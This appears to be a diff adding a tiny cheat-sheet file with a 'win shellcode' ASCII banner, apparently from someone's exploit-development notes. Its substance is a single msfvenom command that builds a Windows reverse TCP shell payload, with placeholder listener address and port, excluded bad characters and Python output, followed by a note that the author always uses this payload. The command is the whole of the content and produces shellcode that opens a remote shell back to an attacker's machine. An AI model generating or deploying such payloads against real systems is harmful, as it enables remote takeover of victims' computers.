@@ -1,0 +1,11 @@
+          _             _          _ _               _      
+__      _(_)_ __    ___| |__   ___| | | ___ ___   __| | ___ 
+\ \ /\ / / | '_ \  / __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \
+ \ V  V /| | | | | \__ \ | | |  __/ | | (_| (_) | (_| |  __/
+  \_/\_/ |_|_| |_| |___/_| |_|\___|_|_|\___\___/ \__,_|\___|
+                                                            
+
+msfvenom -p windows/shell_reverse_tcp LHOST=XXX.XXX.XXX.XXX LPORT=XXXX -b "\xBadchars" -f python
+
+**NOTE**
+I always use this payload another pyaloads are generated looking by the same payload.
